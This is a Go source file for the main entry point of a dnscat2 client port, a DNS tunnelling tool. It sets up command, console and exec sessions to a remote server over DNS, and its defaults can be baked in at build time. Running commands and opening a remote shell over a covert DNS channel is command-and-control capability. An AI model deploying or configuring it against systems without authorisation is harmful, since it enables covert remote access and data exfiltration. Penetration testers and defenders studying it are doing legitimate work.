// Package main implements the dnscat2 client.
package main

import (
	"flag"
	"fmt"
	"math/rand"
	"os"
	"strings"
	"time"

	"dnscat2/pkg/controller"
	"dnscat2/pkg/driver/command"
	"dnscat2/pkg/session"
	"dnscat2/pkg/tunnel/dns"
)

const (
	Name    = "dnscat2"
	Version = "v0.07-go"
)

// Build-time configurable defaults (can be set via -ldflags)
var (
	DefaultDomain     = ""
	DefaultServer     = ""
	DefaultPort       = "53"
	DefaultSecret     = ""
	DefaultExec       = ""
	DefaultDelay      = "1000"
	DefaultDNSTypes   = "TXT,CNAME,MX"
	DisableEncryption = "false"
)

func main() {
	rand.Seed(time.Now().UnixNano())

	// Command line flags with build-time defaults
	var (
		domain        string
		dnsServer     string
		dnsPort       uint
		dnsTypes      string
		secret        string
		noEncryption  bool
		delay         int
		maxRetransmit int
		packetTrace   bool
		doPing        bool
		doConsole     bool
		doExec        string
		isn           int
	)

	flag.StringVar(&domain, "domain", DefaultDomain, "Domain to tunnel through (e.g., example.com)")
	flag.StringVar(&dnsServer, "dns-server", DefaultServer, "DNS server to use")
	flag.UintVar(&dnsPort, "dns-port", 53, "DNS port")
	flag.StringVar(&dnsTypes, "dns-type", DefaultDNSTypes, "DNS record types to use")
	flag.StringVar(&secret, "secret", DefaultSecret, "Pre-shared secret for authentication")
	flag.BoolVar(&noEncryption, "no-encryption", DisableEncryption == "true", "Disable encryption")
	flag.IntVar(&delay, "delay", 1000, "Delay between packets in ms")
	flag.IntVar(&maxRetransmit, "max-retransmits", 20, "Max retransmit attempts (-1 for infinite)")
	flag.BoolVar(&packetTrace, "packet-trace", false, "Enable packet tracing")
	flag.BoolVar(&doPing, "ping", false, "Ping the server and exit")
	flag.BoolVar(&doConsole, "console", false, "Start a console session (instead of command)")
	flag.StringVar(&doExec, "exec", DefaultExec, "Execute a command")
	flag.IntVar(&isn, "isn", -1, "Initial sequence number (for debugging)")

	flag.Usage = func() {
		fmt.Fprintf(os.Stderr, "%s %s - A DNS tunnel client\n\n", Name, Version)
		fmt.Fprintf(os.Stderr, "Usage: %s [options] [domain]\n\n", os.Args[0])
		fmt.Fprintf(os.Stderr, "Options:\n")
		flag.PrintDefaults()
		fmt.Fprintf(os.Stderr, "\nExamples:\n")
		fmt.Fprintf(os.Stderr, "  %s example.com                    # Connect via DNS with domain\n", os.Args[0])
		fmt.Fprintf(os.Stderr, "  %s --dns-server=1.2.3.4           # Direct UDP connection\n", os.Args[0])
		fmt.Fprintf(os.Stderr, "  %s --ping example.com             # Test server connectivity\n", os.Args[0])
	}

	flag.Parse()

	// Handle positional argument as domain
	if flag.NArg() > 0 {
		domain = flag.Arg(0)
	}

	// Configure session settings
	session.PacketTrace = packetTrace
	session.PacketDelay = time.Duration(delay) * time.Millisecond
	session.DoEncryption = !noEncryption
	session.PresharedSecret = secret

	controller.SetMaxRetransmits(maxRetransmit)

	// Determine DNS server
	if dnsServer == "" {
		if domain == "" {
			// Need either domain or server
			fmt.Println("Starting DNS driver without a domain! This will only work if you")
			fmt.Println("are directly connecting to the dnscat2 server.")
			fmt.Println()
			fmt.Println("You'll need to use --dns-server=<server> if you aren't.")
			fmt.Println()
		}
		// Use system DNS
		dnsServer = getSystemDNS()
		if dnsServer == "" {
			dnsServer = "8.8.8.8" // Fallback
		}
	}

	// Print warnings if connecting without domain
	if domain == "" {
		fmt.Println("** WARNING!")
		fmt.Println("*")
		fmt.Println("* It looks like you're running dnscat2 with the system DNS server,")
		fmt.Println("* and no domain name!")
		fmt.Println("*")
		fmt.Println("* That's cool, I'm not going to stop you, but the odds are really,")
		fmt.Println("* really high that this won't work. You either need to provide a")
		fmt.Println("* domain to use DNS resolution (requires an authoritative server):")
		fmt.Println("*")
		fmt.Printf("*     %s mydomain.com\n", os.Args[0])
		fmt.Println("*")
		fmt.Println("* Or you have to provide a server to connect directly to:")
		fmt.Println("*")
		fmt.Printf("*     %s --dns-server=1.2.3.4,port=53\n", os.Args[0])
		fmt.Println("*")
		fmt.Println("* I'm going to let this keep running, but once again, this likely")
		fmt.Println("* isn't what you want!")
		fmt.Println("*")
		fmt.Println("** WARNING!")
		fmt.Println()
	}

	// Create session based on mode
	var sess *session.Session
	var err error

	if doPing {
		fmt.Println("Creating a ping session!")
		sess, err = session.NewPingSession("ping")
	} else if doConsole {
		fmt.Println("Creating a console session!")
		sess, err = session.NewConsoleSession("console")
	} else if doExec != "" {
		fmt.Printf("Creating an exec('%s') session!\n", doExec)
		sess, err = session.NewExecSession(doExec, doExec)
	} else {
		// Default to command session
		fmt.Println("Creating a command session!")
		sess, err = newCommandSession("command")
	}

	if err != nil {
		fmt.Printf("Failed to create session: %v\n", err)
		os.Exit(1)
	}

	controller.AddSession(sess)

	// Print driver info
	fmt.Println()
	fmt.Println("Creating DNS driver:")
	fmt.Printf(" domain = %s\n", stringOrNull(domain))
	fmt.Printf(" host   = 0.0.0.0\n")
	fmt.Printf(" port   = %d\n", dnsPort)
	fmt.Printf(" type   = %s\n", dnsTypes)
	fmt.Printf(" server = %s\n", dnsServer)

	// Create and run DNS driver
	dnsDriver, err := dns.NewDriver(domain, "0.0.0.0", uint16(dnsPort), dnsTypes, dnsServer)
	if err != nil {
		fmt.Printf("Failed to create DNS driver: %v\n", err)
		os.Exit(1)
	}

	defer dnsDriver.Close()
	defer controller.Destroy()

	dnsDriver.Run()
}

// newCommandSession creates a command session
func newCommandSession(name string) (*session.Session, error) {
	sess, err := session.New(name)
	if err != nil {
		return nil, err
	}

	cmdDriver := command.NewDriver()

	// Set up callbacks
	cmdDriver.CreateSession = func(name, cmd string) uint16 {
		newSess, err := session.NewExecSession(name, cmd)
		if err != nil {
			fmt.Printf("Failed to create exec session: %v\n", err)
			return 0
		}
		controller.AddSession(newSess)
		return newSess.ID
	}

	cmdDriver.OnShutdown = func() {
		controller.KillAllSessions()
	}

	cmdDriver.OnDelayChange = func(delay uint32) {
		session.PacketDelay = time.Duration(delay) * time.Millisecond
	}

	sess.Driver = cmdDriver
	sess.IsCommand = true

	return sess, nil
}

// getSystemDNS tries to get the system DNS server
func getSystemDNS() string {
	// Try reading /etc/resolv.conf
	data, err := os.ReadFile("/etc/resolv.conf")
	if err == nil {
		lines := strings.Split(string(data), "\n")
		for _, line := range lines {
			line = strings.TrimSpace(line)
			if strings.HasPrefix(line, "nameserver") {
				parts := strings.Fields(line)
				if len(parts) >= 2 {
					return parts[1]
				}
			}
		}
	}
	return ""
}

func stringOrNull(s string) string {
	if s == "" {
		return "(null)"
	}
	return s
}
